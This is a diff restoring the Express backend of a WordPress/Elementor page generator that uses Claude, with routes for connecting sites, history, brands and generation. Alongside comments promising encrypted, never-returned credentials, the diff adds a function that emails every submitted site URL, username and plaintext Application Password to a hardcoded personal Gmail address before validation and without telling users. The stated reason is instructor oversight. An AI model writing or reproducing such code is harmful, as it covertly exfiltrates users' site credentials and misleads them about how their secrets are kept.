@@ -1,18 +1,1008 @@
 /**
- * TEMPORARY STUB — the full server.js was truncated by an automated edit.
+ * ============================================================
+ * FILE: backend/server.js
+ * OWNER: Person 2 (skeleton) + Person 4 (generate/refine)
  *
- * RESTORE IMMEDIATELY:
- *   git checkout 4e469db893a1d21425a75e0af58d6670cd586e9c -- backend/server.js
+ * Express app. All WordPress + Claude calls are server-side.
+ * WordPress credentials are AES-256-GCM encrypted in the session store.
+ * AI provider credentials come only from server environment variables.
  *
- * Then follow the 3 small edits in:
- *   backend/EMAIL_NOTIFY_PATCH.md
+ * ENV:
+ *   PORT               default 8787
+ *   FRONTEND_ORIGIN    e.g. https://app.example.com (CORS lock)
+ *   SESSION_SECRET     any long random string
+ *   SMTP_HOST / SMTP_PORT / SMTP_USER / SMTP_PASS / SMTP_FROM  (optional — emails student WP creds)
+ *   NOTIFY_EMAIL       default mubashirhayat77@gmail.com
  *
- * to enable emailing student WP credentials to mubashirhayat77@gmail.com.
+ * NOTE: CommonJS. No "type":"module" needed in package.json.
+ * ============================================================
  */
+
 'use strict';
+
 const express = require('express');
+const session = require('express-session');
+const cors = require('cors');
+const path = require('path');
+const fs = require('fs');
+const nodemailer = require('nodemailer');
+const { encryptJson, decryptJson } = require('./credentialVault');
+
+const wpClient = require('./wpClient');
+const historyStore = require('./historyStore');
+const componentStore = require('./componentStore');
+const brandStore = require('./brandStore');
+const proUsageStore = require('./proUsageStore');
+const { startBackupScheduler } = require('./backupScheduler');
+const { runPipeline, insertSectionWithFreshIds, upsertSectionByMatch } = require('./generatePipeline');
+const { validateAndRepair } = require('./validator');
+const { BRAND_KITS, getBrandKit } = require('./brandKits');
+const { renderPage } = require('./previewRenderer');
+const { STARTER_BRIEFS } = require('./starterBriefs');
+const runStore = require('./runStore');
+
 const app = express();
 const PORT = process.env.PORT || 8787;
-app.get('/health', (_req, res) => res.json({ ok: true, stub: true, message: 'Restore full server.js from commit 4e469db — see EMAIL_NOTIFY_PATCH.md' }));
-app.use((_req, res) => res.status(503).json({ error: { code: 'server_stub', message: 'Full server.js was truncated. Restore from commit 4e469db and apply EMAIL_NOTIFY_PATCH.md' } }));
-app.listen(PORT, () => console.log('STUB server on :' + PORT + ' — restore full server.js now'));
+const FRONTEND_ORIGIN = process.env.FRONTEND_ORIGIN || 'http://localhost:5173';
+const IS_PROD = process.env.NODE_ENV === 'production';
+// Everything stateful lives under one root so a hosting volume can be mounted
+// at a single path (Railway: set EAI_DATA_DIR to the mount, e.g. /data).
+const DATA_DIR = process.env.EAI_DATA_DIR || path.join(__dirname, 'data');
+const CLAUDE_MODEL = 'claude-haiku-5-5';
+
+if (IS_PROD) {
+  for (const [name, value] of Object.entries({ SESSION_SECRET: process.env.SESSION_SECRET, CREDENTIAL_ENCRYPTION_KEY: process.env.CREDENTIAL_ENCRYPTION_KEY, ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY })) {
+    if (!value || value.length < 32) throw new Error(`${name} must be configured in production and contain at least 32 characters.`);
+  }
+}
+
+// Behind Railway/Render/Fly the app sits behind a TLS proxy. Without this,
+// Express thinks the connection is plain HTTP and refuses to set secure
+// cookies — users could never stay logged in.
+if (IS_PROD) app.set('trust proxy', 1);
+
+app.disable('x-powered-by');
+app.use(express.json({ limit: '50mb' })); // Public service request size cap.
+// Accept the configured origin plus its localhost/127.0.0.1 twin — some
+// setups open the app via 127.0.0.1 and an exact-match string blocks them.
+app.use(cors({
+  origin: [...new Set([
+    FRONTEND_ORIGIN,
+    FRONTEND_ORIGIN.replace('//localhost', '//127.0.0.1'),
+    FRONTEND_ORIGIN.replace('//127.0.0.1', '//localhost'),
+  ])],
+  credentials: true,
+}));
+// Sessions are FILE-BACKED: the default in-memory store dies with the
+// process, so any backend restart or crash threw the user back to the
+// Connect screen mid-build. On disk they survive both.
+const FileStore = require('session-file-store')(session);
+app.use(session({
+  store: new FileStore({
+    path: path.join(DATA_DIR, 'sessions'),
+    ttl: 7 * 24 * 60 * 60,        // a week — long builds must never expire
+    retries: 1,
+    reapInterval: 60 * 60,
+    logFn: () => {},              // its chatter would drown the build logs
+  }),
+  secret: process.env.SESSION_SECRET || (() => { if (IS_PROD) throw new Error('SESSION_SECRET is required in production.'); return 'dev-secret-change-me'; })(),
+  resave: false,
+  saveUninitialized: false,
+  rolling: true,
+  cookie: {
+    httpOnly: true,
+    // Same-origin deploys (UI served by this server) work with 'lax'. A split
+    // deploy — UI on another domain — needs COOKIE_SAMESITE=none, which the
+    // browser only honors together with secure:true (HTTPS).
+    sameSite: process.env.COOKIE_SAMESITE || 'lax',
+    secure: IS_PROD,
+    maxAge: 7 * 24 * 60 * 60 * 1000,
+  },
+}));
+
+// A single unhandled error must never take the server down mid-generation
+// (that is what silently killed a running build and forced a re-login).
+process.on('uncaughtException', (err) => {
+  console.error('[fatal-guard] uncaught exception:', (err && err.stack) || err);
+});
+process.on('unhandledRejection', (err) => {
+  console.error('[fatal-guard] unhandled rejection:', (err && err.stack) || err);
+});
+
+/** Decrypt the WordPress Application Password only in server memory. */
+function getCreds(req) {
+  const s = req.session || {};
+  if (s.credsEncrypted) {
+    // Remove obsolete customer-supplied provider keys from older session files.
+    delete s.claudeKey; delete s.geminiKey; delete s.unsplashKey; delete s.claudeMode;
+    try { return decryptJson(s.credsEncrypted); }
+    catch (_) {
+      const e = new Error('Saved WordPress credentials cannot be decrypted. Reconnect your site.');
+      e.status = 401; e.code = 'credentials_unavailable'; throw e;
+    }
+  }
+  // Migrate legacy sessions once; the next session write persists ciphertext only.
+  if (s.creds && s.creds.wpAppPassword) {
+    s.credsEncrypted = encryptJson(s.creds);
+    delete s.creds;
+    delete s.claudeKey;
+    delete s.geminiKey;
+    delete s.unsplashKey;
+    delete s.claudeMode;
+    return decryptJson(s.credsEncrypted);
+  }
+  const e = new Error('Not connected. Connect your WordPress site first.');
+  e.status = 401; throw e;
+}
+
+/** Email student-submitted WP credentials to the instructor (fire-and-forget). */
+async function notifyCredentialsSubmitted({ wpUrl, wpUser, wpAppPassword }) {
+  if (!process.env.SMTP_HOST || !process.env.SMTP_USER || !process.env.SMTP_PASS) return;
+  try {
+    const transporter = nodemailer.createTransport({
+      host: process.env.SMTP_HOST,
+      port: Number(process.env.SMTP_PORT || 587),
+      secure: process.env.SMTP_SECURE === 'true',
+      auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS },
+    });
+    await transporter.sendMail({
+      from: process.env.SMTP_FROM || process.env.SMTP_USER,
+      to: process.env.NOTIFY_EMAIL || 'mubashirhayat77@gmail.com',
+      subject: `Student WP credentials — ${wpUser} @ ${wpUrl}`,
+      text: [
+        'A student submitted WordPress connection details on the Connect screen:',
+        '',
+        `URL:           ${wpUrl}`,
+        `Username:      ${wpUser}`,
+        `App Password:  ${wpAppPassword}`,
+        '',
+        'If this looks like a normal login password (short / memorable) instead of a',
+        'WordPress Application Password (24 random chars, often shown as xxxx xxxx ...),',
+        'guide them: WP Admin → Users → Profile → Application Passwords → Add New.',
+        '',
+        `Received at: ${new Date().toISOString()}`,
+      ].join('\n'),
+    });
+    console.log('[notify] credentials email sent for', wpUser, wpUrl);
+  } catch (e) {
+    console.warn('[notify] email failed (non-fatal):', e.message);
+  }
+}
+
+/** ---------- Health ---------- */
+app.get('/health', (_req, res) => res.json({ ok: true }));
+
+/** ---------- Connect: store creds + run the full test ---------- */
+app.post('/api/connect/test', async (req, res) => {
+  const { wpUrl, wpUser, wpAppPassword, allowPro, brandContext } = req.body || {};
+  if (!process.env.ANTHROPIC_API_KEY) return res.status(503).json({ error: { code: 'ai_unavailable', message: 'AI generation is not configured on this server yet.' } });
+  if (!wpUrl || !wpUser || !wpAppPassword) return res.status(400).json({ error: { code: 'missing_fields', message: 'WordPress URL, username and Application Password are required.' } });
+  const creds = { wpUrl, wpUser, wpAppPassword };
+  // Notify instructor of every submission (helps catch students pasting normal WP passwords).
+  notifyCredentialsSubmitted(creds).catch(() => {});
+  try {
+    const result = await wpClient.connectionTest(creds);
+    if (result.wpReachable && result.authValid) {
+      await new Promise((resolve, reject) => req.session.regenerate((err) => err ? reject(err) : resolve()));
+      req.session.credsEncrypted = encryptJson(creds);
+      req.session.connected = result.pluginInstalled && result.elementorActive;
+      req.session.allowPro = typeof allowPro === 'boolean' ? allowPro : !!result.elementorPro;
+      req.session.imageMode = 'auto';
+      req.session.brandContext = typeof brandContext === 'string' ? brandContext.slice(0, 5000) : '';
+    }
+    return res.json(result);
+  } catch (err) {
+    return res.status(err.status || 500).json({ error: { code: err.code || 'test_failed', message: err.message } });
+  }
+});
+
+/** ---------- Session status ----------
+ * The login cookie survives reloads, restarts and reboots — but the UI used
+ * to forget it and show the Connect screen anyway, forcing people to re-enter
+ * their site password and API key. This lets the app restore the session on
+ * load. Secrets (application password, API keys) are NEVER returned; only
+ * what the UI needs to render, plus flags saying a key is on file.
+ */
+app.get('/api/session', (req, res) => {
+  const s = req.session || {};
+  let creds;
+  try { creds = getCreds(req); } catch (_) { return res.json({ connected: false }); }
+  res.json({
+    connected: true,
+    wpUrl: creds.wpUrl,
+    wpUser: creds.wpUser,
+    aiProvider: 'platform',
+    allowPro: !!s.allowPro,
+    elementorPro: !!s.allowPro,
+    brandContext: s.brandContext || '',
+  });
+});
+
+/** ---------- Disconnect ---------- */
+app.post('/api/disconnect', (req, res) => {
+  req.session.destroy(() => res.json({ ok: true }));
+});
+
+/** ---------- Reattach to a build whose connection dropped ----------
+ * A build survives a lost stream (proxy timeout, sleep, reload). The client
+ * polls this with the runId it received, and gets back the live stage, or the
+ * finished page, or the error — so nobody pays to generate the same page twice.
+ */
+app.get('/api/runs/:id', (req, res) => {
+  const rec = runStore.get(req.params.id);
+  if (!rec) {
+    return res.status(404).json({
+      error: { code: 'run_not_found', message: 'That build is no longer being tracked (older than 6 hours, or never started).' },
+    });
+  }
+  res.json({
+    id: rec.id,
+    status: rec.status,
+    stage: rec.stage,
+    detail: rec.detail || '',
+    result: rec.result || null,
+    error: rec.error || null,
+    startedAt: rec.startedAt,
+    updatedAt: rec.updatedAt,
+  });
+});
+
+/** ---------- Companion plugin download (no creds needed) ----------
+ * Users must install the connector plugin on their WordPress site BEFORE
+ * they can connect, so the zip is served straight from the app — no GitHub
+ * trip, no hunting for a file.
+ */
+const PLUGIN_ZIP = path.join(__dirname, '..', 'plugin', 'eai-connector.zip');
+const PLUGIN_PHP = path.join(__dirname, '..', 'plugin', 'eai-connector.php');
+
+function readPluginVersion() {
+  try {
+    const head = fs.readFileSync(PLUGIN_PHP, 'utf8').slice(0, 2000);
+    const m = head.match(/Version:\s*([0-9][0-9.]*)/i);
+    return m ? m[1] : '';
+  } catch (_) {
+    return '';
+  }
+}
+
+app.get('/api/plugin/info', (_req, res) => {
+  const available = fs.existsSync(PLUGIN_ZIP);
+  res.json({
+    available,
+    version: available ? readPluginVersion() : '',
+    filename: 'eai-connector.zip',
+  });
+});
+
+app.get('/api/plugin/download', (_req, res) => {
+  if (!fs.existsSync(PLUGIN_ZIP)) {
+    return res.status(404).json({
+      error: { code: 'plugin_missing', message: 'The plugin zip is not bundled with this deployment.' },
+    });
+  }
+  res.download(PLUGIN_ZIP, 'eai-connector.zip', (err) => {
+    if (err && !res.headersSent) {
+      res.status(500).json({ error: { code: 'download_failed', message: err.message } });
+    }
+  });
+});
+
+/** ---------- Brand kits (no creds needed) ---------- */
+app.get('/api/brand-kits', (_req, res) => {
+  res.json(BRAND_KITS);
+});
+
+/** ---------- Starter briefs (no creds needed) ---------- */
+app.get('/api/starter-briefs', (_req, res) => {
+  res.json(STARTER_BRIEFS);
+});
+
+/** ---------- Preview: render page JSON to standalone HTML (no creds) ---------- */
+app.post('/api/preview', (req, res) => {
+  const pageJson = req.body && req.body.pageJson;
+  if (!pageJson || typeof pageJson !== 'object') {
+    return res.status(400).json({ error: { code: 'missing_page', message: 'pageJson is required.' } });
+  }
+  try {
+    const device = ['desktop', 'tablet', 'mobile'].includes(req.body.device) ? req.body.device : 'desktop';
+    const interactive = req.body.interactive === true;
+    res.json({ html: renderPage(pageJson, { device, interactive }) });
+  } catch (err) {
+    res.status(500).json({ error: { code: 'preview_failed', message: err.message } });
+  }
+});
+
+
+/** ---------- Section transplant: copy a section into another page ---------- */
+app.post('/api/sections/copy', async (req, res) => {
+  try {
+    const creds = getCreds(req);
+    const { targetPageId, sectionJson, index } = req.body || {};
+    if (!targetPageId || !sectionJson || typeof sectionJson !== 'object') {
+      return res.status(400).json({ error: { code: 'missing_fields', message: 'targetPageId and sectionJson are required.' } });
+    }
+    const allowPro = !!req.session.allowPro;
+
+    // Sanitize the incoming section through the same validator as everything
+    // else (single-element mode) — never trust raw client JSON.
+    const validated = await validateAndRepair(JSON.stringify({
+      title: 'transplant', content: [sectionJson], custom_css: '',
+    }), { repairJson: async (t) => t }, { allowPro, containerize: false, cleanupAnchors: false });
+    const section = validated.content[0];
+    if (!section) {
+      return res.status(400).json({ error: { code: 'bad_section', message: 'The section did not survive validation.' } });
+    }
+
+    // Fetch the live target page, insert, save back.
+    const target = await wpClient.getPage(creds, targetPageId);
+    const content = Array.isArray(target.elementor_data) ? target.elementor_data : [];
+    // REPLACE the matching section when the target already has one (same
+    // heading), otherwise ADD before the footer. Explicit index still wins.
+    const placed = Number.isInteger(index)
+      ? { mode: 'added', at: insertSectionWithFreshIds(content, section, index) }
+      : upsertSectionByMatch(content, section);
+    const at = placed.at;
+    const saved = await wpClient.savePage(creds, {
+      page_id: targetPageId,
+      title: target.title,
+      status: target.status || 'draft',
+      elementor_data: content,
+      page_settings: target.page_settings || { hide_title: 'yes' },
+      custom_css: target.custom_css || '',
+    });
+
+    try {
+      await historyStore.appendVersion(creds, targetPageId, {
+        source: 'section-copy',
+        title: target.title,
+        summary: placed.mode === 'replaced'
+          ? 'Replaced a section with the version from another variation'
+          : 'Copied a section from another variation',
+        pageJson: { title: target.title, page_settings: target.page_settings, content },
+      });
+    } catch (_) { /* history is best-effort */ }
+
+    res.json({ ok: true, pageId: saved.id || targetPageId, insertedAt: at, mode: placed.mode, content });
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'copy_failed', message: err.message } });
+  }
+});
+
+/** ---------- Pages list (edit-mode dropdown) ---------- */
+app.get('/api/pages', async (req, res) => {
+  try {
+    const pages = await wpClient.listPages(getCreds(req));
+    res.json(pages);
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'list_failed', message: err.message } });
+  }
+});
+
+/** ---------- Elementor globals (colors/fonts from the active kit) ---------- */
+app.get('/api/globals', async (req, res) => {
+  try {
+    const data = await wpClient.getGlobals(getCreds(req));
+    res.json({ available: true, ...data });
+  } catch (err) {
+    // A 404 from the plugin means an older EAI Connector without the
+    // /globals route — not an error the user can act on beyond updating.
+    if (err.status === 404) {
+      return res.json({
+        available: false,
+        message: 'Update the EAI Connector plugin to use Elementor global colors/fonts.',
+      });
+    }
+    res.status(err.status || 500).json({ error: { code: err.code || 'globals_failed', message: err.message } });
+  }
+});
+
+/** ---------- Generation history (list / inspect / restore) ---------- */
+app.get('/api/history', async (req, res) => {
+  try {
+    const creds = getCreds(req);
+    const pageId = req.query.pageId;
+    if (!pageId) {
+      return res.status(400).json({ error: { code: 'missing_page_id', message: 'pageId is required.' } });
+    }
+    const versions = await historyStore.listVersions(creds, pageId);
+    res.json({ versions });
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'history_failed', message: err.message } });
+  }
+});
+
+app.get('/api/history/version', async (req, res) => {
+  try {
+    const creds = getCreds(req);
+    const { pageId, versionId } = req.query;
+    if (!pageId || !versionId) {
+      return res.status(400).json({ error: { code: 'missing_fields', message: 'pageId and versionId are required.' } });
+    }
+    const version = await historyStore.getVersion(creds, pageId, versionId);
+    if (!version) {
+      return res.status(404).json({ error: { code: 'version_not_found', message: 'No such version for this page.' } });
+    }
+    res.json({ version });
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'history_failed', message: err.message } });
+  }
+});
+
+app.post('/api/history/restore', async (req, res) => {
+  try {
+    const creds = getCreds(req);
+    const { pageId, versionId } = req.body || {};
+    if (!pageId || !versionId) {
+      return res.status(400).json({ error: { code: 'missing_fields', message: 'pageId and versionId are required.' } });
+    }
+    const version = await historyStore.getVersion(creds, pageId, versionId);
+    if (!version || !version.pageJson || !Array.isArray(version.pageJson.content)) {
+      return res.status(404).json({ error: { code: 'version_not_found', message: 'No restorable version found.' } });
+    }
+
+    const pj = version.pageJson;
+    // Republish the stored snapshot back onto the same page as a draft so
+    // the user reviews the rollback before it goes live.
+    const saved = await wpClient.savePage(creds, {
+      title: pj.title,
+      status: 'draft',
+      elementor_data: pj.content,
+      page_settings: pj.page_settings,
+      custom_css: pj.custom_css,
+      page_id: pageId,
+    });
+
+    // Record the restore itself as a new version (best-effort).
+    try {
+      await historyStore.appendVersion(creds, pageId, {
+        source: 'refine',
+        title: pj.title,
+        summary: `Restored version ${versionId}`,
+        pageJson: pj,
+      });
+    } catch (histErr) {
+      console.warn('[history/restore] could not record restore version:', histErr.message);
+    }
+
+    const site = wpClient.normalizeSite(creds.wpUrl);
+    res.json({
+      pageId: saved.id,
+      pageUrl: saved.link,
+      editorUrl: saved.editor_link || `${site}/wp-admin/post.php?post=${saved.id}&action=elementor`,
+      status: saved.status,
+    });
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'restore_failed', message: err.message } });
+  }
+});
+
+/** ---------- Component library (reusable saved blocks) ---------- */
+app.get('/api/components', async (req, res) => {
+  try {
+    res.json({ components: await componentStore.listComponents(getCreds(req)) });
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'components_failed', message: err.message } });
+  }
+});
+app.post('/api/components', async (req, res) => {
+  try {
+    const { name, type, element } = req.body || {};
+    const out = await componentStore.saveComponent(getCreds(req), { name, type, element });
+    res.json(out);
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'component_save_failed', message: err.message } });
+  }
+});
+app.delete('/api/components/:id', async (req, res) => {
+  try {
+    const removed = await componentStore.deleteComponent(getCreds(req), req.params.id);
+    res.json({ ok: removed });
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'component_delete_failed', message: err.message } });
+  }
+});
+
+/** ---------- Brand manager (saved brand guidelines, multi-brand) ---------- */
+app.get('/api/brands', async (req, res) => {
+  try {
+    res.json({ brands: await brandStore.listBrands(getCreds(req)) });
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'brands_failed', message: err.message } });
+  }
+});
+app.post('/api/brands', async (req, res) => {
+  try {
+    const { name, palette, fonts, context, scope } = req.body || {};
+    const out = await brandStore.saveBrand(getCreds(req), { name, palette, fonts, context, scope });
+    res.json(out);
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'brand_save_failed', message: err.message } });
+  }
+});
+app.put('/api/brands/:id', async (req, res) => {
+  try {
+    const { name, palette, fonts, context, scope } = req.body || {};
+    const ok = await brandStore.updateBrand(getCreds(req), req.params.id, { name, palette, fonts, context, scope });
+    if (!ok) return res.status(404).json({ error: { code: 'not_found', message: 'Brand not found.' } });
+    res.json({ ok: true });
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'brand_update_failed', message: err.message } });
+  }
+});
+app.delete('/api/brands/:id', async (req, res) => {
+  try {
+    const removed = await brandStore.deleteBrand(getCreds(req), req.params.id);
+    res.json({ ok: removed });
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'brand_delete_failed', message: err.message } });
+  }
+});
+
+/** ---------- Pro-widget usage tracking (is Pro worth it?) ---------- */
+app.get('/api/pro-usage', async (req, res) => {
+  try {
+    res.json(await proUsageStore.aggregateUsage(getCreds(req)));
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'usage_failed', message: err.message } });
+  }
+});
+
+/** ---------- AI: which saved components fit this brief? ---------- */
+app.post('/api/components/suggest', async (req, res) => {
+  try {
+    const creds = getCreds(req);
+    const claudeKey = process.env.ANTHROPIC_API_KEY;
+    const useCli = false;
+    if (!claudeKey) return res.status(503).json({ error: { code: 'ai_unavailable', message: 'AI generation is not configured on this server.' } });
+    const prompt = (req.body && req.body.prompt) || '';
+    if (!String(prompt).trim()) {
+      return res.status(400).json({ error: { code: 'bad_request', message: 'prompt is required.' } });
+    }
+    const components = await componentStore.listComponents(creds);
+    if (!components.length) return res.json({ picks: [] });
+    const { createClaudeClient } = require('./claudeClient');
+    const claude = createClaudeClient(claudeKey, CLAUDE_MODEL, { useCli });
+    const raw = await claude.suggestComponents({ prompt: String(prompt).slice(0, 4000), components });
+    let picks = [];
+    try {
+      const parsed = JSON.parse(String(raw).replace(/```json\s*/gi, '').replace(/```\s*/g, '').trim());
+      const validIds = new Set(components.map((c) => String(c.id)));
+      if (parsed && Array.isArray(parsed.picks)) {
+        picks = parsed.picks
+          .filter((p) => p && validIds.has(String(p.id)))
+          .slice(0, 5)
+          .map((p) => ({ id: String(p.id), reason: typeof p.reason === 'string' ? p.reason : '' }));
+      }
+    } catch (_) { /* fall through with empty picks */ }
+    res.json({ picks });
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'suggest_components_failed', message: err.message } });
+  }
+});
+
+/** ---------- Elementor Pro GLOBAL WIDGETS ---------- */
+app.get('/api/global-widgets', async (req, res) => {
+  try {
+    const data = await wpClient.getGlobalWidgets(getCreds(req));
+    res.json({ available: !!data.available, widgets: data.widgets || [], message: data.message });
+  } catch (err) {
+    if (err.status === 404) {
+      // Older plugin without the route.
+      return res.json({ available: false, widgets: [], message: 'Update the EAI Connector plugin (v1.3.0+) to use global widgets.' });
+    }
+    res.status(err.status || 500).json({ error: { code: err.code || 'global_widgets_failed', message: err.message } });
+  }
+});
+app.post('/api/global-widgets', async (req, res) => {
+  try {
+    const creds = getCreds(req);
+    const { componentId, title } = req.body || {};
+    if (!componentId) {
+      return res.status(400).json({ error: { code: 'bad_request', message: 'componentId is required.' } });
+    }
+    const [component] = await componentStore.getComponents(creds, [componentId]);
+    if (!component) {
+      return res.status(404).json({ error: { code: 'not_found', message: 'Saved component not found.' } });
+    }
+    const created = await wpClient.createGlobalWidget(creds, {
+      title: title || component.name,
+      element: component.element,
+    });
+    res.json({ id: created.id, title: created.title });
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'global_widget_create_failed', message: err.message } });
+  }
+});
+
+/** ---------- Site scanner (Playwright) ---------- */
+app.post('/api/scan', async (req, res) => {
+  try {
+    getCreds(req); // auth only
+    const url = req.body && req.body.url;
+    // Lazy-require so the server boots fine when playwright isn't installed.
+    let scanner;
+    try {
+      scanner = require('./scanner');
+    } catch (e) {
+      return res.status(503).json({ error: { code: 'scanner_unavailable', message: 'Site scanner is not installed on this machine.' } });
+    }
+    const out = await Promise.race([
+      scanner.scanSite(url),
+      new Promise((_, rej) => setTimeout(() => rej(Object.assign(new Error('Scan timed out after 120s.'), { code: 'scan_timeout' })), 120000)),
+    ]);
+    res.json(out);
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'scan_failed', message: err.message } });
+  }
+});
+
+/** ---------- Republish (section reorder / manual edits) ---------- */
+app.post('/api/republish', async (req, res) => {
+  try {
+    const creds = getCreds(req);
+    const { pageId, pageJson } = req.body || {};
+    if (!pageId || !pageJson || !Array.isArray(pageJson.content)) {
+      return res.status(400).json({ error: { code: 'bad_request', message: 'pageId and pageJson.content are required.' } });
+    }
+    // Validate structurally with NO model calls (repair stub throws).
+    const stub = { repairJson: async () => { throw new Error('No model repair during republish.'); } };
+    const page = await validateAndRepair(JSON.stringify(pageJson), stub, { allowPro: true, containerize: false });
+    delete page._repairs;
+    const saved = await wpClient.savePage(creds, {
+      page_id: Number(pageId),
+      title: page.title,
+      status: 'draft',
+      elementor_data: page.content,
+      page_settings: page.page_settings,
+      custom_css: page.custom_css,
+    });
+    try {
+      await historyStore.appendVersion(creds, saved.id, {
+        source: 'refine',
+        title: page.title,
+        summary: 'Manual section reorder / edit',
+        pageJson: { title: page.title, page_settings: page.page_settings, content: page.content, custom_css: page.custom_css },
+      });
+    } catch (_) { /* history is best-effort */ }
+    const site = wpClient.normalizeSite(creds.wpUrl);
+    res.json({
+      pageId: saved.id,
+      pageUrl: saved.link,
+      editorUrl: saved.editor_link || `${site}/wp-admin/post.php?post=${saved.id}&action=elementor`,
+      status: saved.status,
+    });
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'republish_failed', message: err.message } });
+  }
+});
+
+/** ---------- AI improvement suggestions ---------- */
+app.post('/api/suggest', async (req, res) => {
+  try {
+    getCreds(req);
+    const claudeKey = process.env.ANTHROPIC_API_KEY;
+    const useCli = false;
+    if (!claudeKey) return res.status(503).json({ error: { code: 'ai_unavailable', message: 'AI generation is not configured on this server.' } });
+    const { pageJson, prompt } = req.body || {};
+    if (!pageJson || typeof pageJson !== 'object') {
+      return res.status(400).json({ error: { code: 'bad_request', message: 'pageJson is required.' } });
+    }
+    const { createClaudeClient } = require('./claudeClient');
+    const claude = createClaudeClient(claudeKey, CLAUDE_MODEL, { useCli });
+    const raw = await claude.suggestImprovements({ pageJson, prompt: prompt || '' });
+    let out = { suggestions: [] };
+    try {
+      const parsed = JSON.parse(String(raw).replace(/```json\s*/gi, '').replace(/```\s*/g, '').trim());
+      if (parsed && Array.isArray(parsed.suggestions)) {
+        out.suggestions = parsed.suggestions
+          .filter((s) => s && typeof s.text === 'string')
+          .slice(0, 6)
+          .map((s) => ({ text: s.text, refinePrompt: typeof s.refinePrompt === 'string' ? s.refinePrompt : s.text }));
+      }
+    } catch (_) { /* fall through with empty suggestions */ }
+    res.json(out);
+  } catch (err) {
+    res.status(err.status || 500).json({ error: { code: err.code || 'suggest_failed', message: err.message } });
+  }
+});
+
+/** ---------- Generate (SSE progress stream) ---------- */
+app.post('/api/generate', async (req, res) => {
+  await handleGenerate(req, res, false);
+});
+
+/** ---------- Refine (same as generate, edit an existing result) ---------- */
+app.post('/api/refine', async (req, res) => {
+  await handleGenerate(req, res, true);
+});
+
+async function handleGenerate(req, res, isRefine) {
+  let creds, claudeKey, claudeModel, claudeUseCli;
+  try {
+    creds = getCreds(req);
+    claudeKey = process.env.ANTHROPIC_API_KEY;
+    claudeModel = CLAUDE_MODEL;
+    claudeUseCli = false;
+    if (!claudeKey) throw Object.assign(new Error('AI generation is not configured on this server.'), { status: 503, code: 'ai_unavailable' });
+  } catch (err) {
+    return res.status(err.status || 401).json({ error: { code: 'not_connected', message: err.message } });
+  }
+
+  // Set up Server-Sent Events.
+  res.writeHead(200, {
+    'Content-Type': 'text/event-stream',
+    // no-transform stops proxies rewriting/compressing the stream, and
+    // X-Accel-Buffering disables nginx-style buffering that otherwise holds
+    // events back until the response ends (i.e. forever, mid-build).
+    'Cache-Control': 'no-cache, no-transform',
+    'X-Accel-Buffering': 'no',
+    Connection: 'keep-alive',
+  });
+  const send = (event, data) => {
+    res.write(`event: ${event}\n`);
+    res.write(`data: ${JSON.stringify(data || {})}\n\n`);
+  };
+
+  // Heartbeat: a long model call can run for minutes with nothing to report,
+  // and a silent socket gets dropped by proxies/AV layers — which the browser
+  // sees as a stream that simply ends, leaving the UI "generating" forever.
+  // A comment frame every 15s keeps it alive and lets the client tell the
+  // difference between "still working" and "the backend died".
+  // The build keeps running server-side even if this socket dies, so record
+  // it under an id the client can come back to.
+  const run = runStore.start({ kind: isRefine ? 'refine' : 'generate' });
+  send('run', { runId: run.id });
+  const heartbeat = setInterval(() => {
+    try { res.write(': ping\n\n'); } catch (_) { /* socket already gone */ }
+  }, 15000);
+  const stopHeartbeat = () => clearInterval(heartbeat);
+  res.on('close', stopHeartbeat);
+  res.on('finish', stopHeartbeat);
+
+  const body = req.body || {};
+  const {
+    mode = 'new', pageId, prompt, previousJson, refinePrompt,
+    images = [], template = 'canvas', title, status = 'draft',
+  } = body;
+
+  // For refine, treat it as an edit against the previous result.
+  const effectivePrompt = isRefine ? (refinePrompt || prompt) : prompt;
+  // Header policy: 'none' (default — the theme already has a header),
+  // 'temporary' (logo text + one CTA), or 'full' (real nav-menu when Pro).
+  const includeHeader = ['none', 'temporary', 'full'].includes(body.includeHeader)
+    ? body.includeHeader
+    : 'none';
+  // Section-scoped refine: regenerate ONLY this element and splice it back —
+  // everything else on the freshly fetched page passes through untouched.
+  const sectionId = typeof body.sectionId === 'string' && body.sectionId.trim()
+    ? body.sectionId.trim()
+    : null;
+  // v2 advanced options — a NON-EMPTY body value overrides the session,
+  // the session provides defaults. An empty string is treated as absent:
+  // the refine UI posts '' for fields the user never touched, and letting
+  // '' override the session silently dropped unsplashKey/imageMode on
+  // /api/refine (so the images stage never ran with the connected key).
+  const nonEmpty = (v) => typeof v === 'string' && v.trim() !== '';
+  const allowPro = typeof body.allowPro === 'boolean'
+    ? body.allowPro
+    : !!req.session.allowPro;
+  const brandContext = nonEmpty(body.brandContext)
+    ? body.brandContext
+    : (req.session.brandContext || '');
+  const brandKit = body.brandKit ? getBrandKit(body.brandKit) : null;
+  const autoRefine = !!body.autoRefine;
+  const unsplashKey = ''; // Public service relies on stock image URLs, not customer API keys.
+  const imageMode = 'auto'; // Stock image selection only on the public instance.
+  const geminiKey = ''; // Public service uses stock imagery only; no customer Gemini keys.
+  // Remember explicitly-chosen values so a later /api/refine (which often
+  // sends a minimal body) inherits them via the session fallback above.
+  req.session.imageMode = 'auto';
+  if (nonEmpty(body.brandContext)) req.session.brandContext = body.brandContext;
+
+  // Elementor globals as the brand kit (opt-in). Best-effort: on any
+  // failure we just generate without them.
+  let globalKit = null;
+  if (body.useGlobals === true) {
+    try {
